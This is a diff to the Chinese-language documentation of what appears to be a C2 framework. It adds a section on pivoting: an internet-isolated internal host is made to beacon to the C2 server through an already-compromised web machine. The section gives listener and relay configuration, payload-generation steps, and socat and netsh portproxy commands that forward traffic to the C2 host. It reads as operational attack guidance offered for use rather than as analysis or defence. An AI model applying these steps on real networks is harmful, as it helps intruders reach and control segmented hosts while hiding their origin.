@@ -164,7 +164,57 @@ TestUpstreamListMergesAndDedups           # 列表优先 + 去重去空白 + DNS
 TestConfigValidationDNSOnly               # 纯 DNS 中继配置合法
 ```
 
-## 9. 已知限制
+## 9. 内网跳板：让不通外网的主机经已上线主机上线
+
+场景：
+
+```
+内网主机 A（无外网） --LAN--> Web 机器（已上线，可出网） --TCP--> C2 服务端
+```
+
+客户端本身没有 `listen` / `portfwd` 命令，不能直接在内网侧开入口；做法是在
+Web 机器上跑一级 `tshell-relay`（或用系统自带的 portproxy/socat），把 A 的
+C2 流量透明转发到服务端。
+
+以 TCP 传输为例：
+
+1. **服务端建监听器**
+   - `listenAddress = 0.0.0.0:18195`（服务端实际 bind）
+   - `connectAddress = <Web 机器内网 IP>:18195`（生成载荷时 patch 进 A）
+   - 启动该监听器，并记下它的 VKey/加密盐（正常自动生成）
+
+2. **Web 机器放中继**
+   ```json
+   {
+     "listen": "0.0.0.0:18195",
+     "upstream": "<C2 公网地址>:18195",
+     "health_listen": "127.0.0.1:18081"
+   }
+   ```
+   运行 `tshell-relay -config relay.json`。Web 机器的防火墙要允许 A 访问 18195。
+
+3. **生成 A 的载荷**
+   在「客户端生成」里选择第 1 步的监听器。A 的载荷会连
+   `<Web 机器内网 IP>:18195`，中继把字节转发到 C2 的 18195。
+
+4. **上线结果**
+   A 上线后，服务端看到的是 Web 机器的来源 IP；A 的真实 IP 在客户端自报的
+   MetaInfo 里。中继不持有会话密钥，指令仍是 A ↔ 服务端端到端加密。
+
+注意事项：
+
+- 服务端监听器的 `connect_address` 必须是 **A 能访问的 Web 机器地址**；
+  `listen_address` 仍是服务端自己的 bind 地址，两者不能填反。
+- Web 机器与 C2 之间要放通 `upstream` 端口；A 与 Web 机器之间要放通 `listen` 端口。
+- HTTP/WebSocket/KCP 也可用同一条 TCP 中继（字节透明）；KCP 配
+  `udp_listen`/`udp_upstream`，DNS 配 `dns_listen`/`dns_upstream`。
+- HTTPS 透传时 A 会按 Web 机器地址校验证书；最稳妥的是这条链路先用 TCP 传输，
+  或在 Web 机器上做 TLS 终止并给 Web 机器地址签发证书。
+- 不想额外放二进制时，Windows 可用 `netsh interface portproxy`，Linux 可用
+  `socat TCP-LISTEN:18195,fork TCP:<C2>:18195`，效果等价但少了中继的连接上限/
+  健康检查/多上游能力。
+
+## 10. 已知限制
 
 - **UDP 中继只覆盖 KCP**：DNS 走独立的、懂协议的那条路径（见 §6），不复用裸转发。
 - 中继不记录 beacon 的真实 IP 到服务端（MetaInfo 里有，但那是 beacon 自报的）。
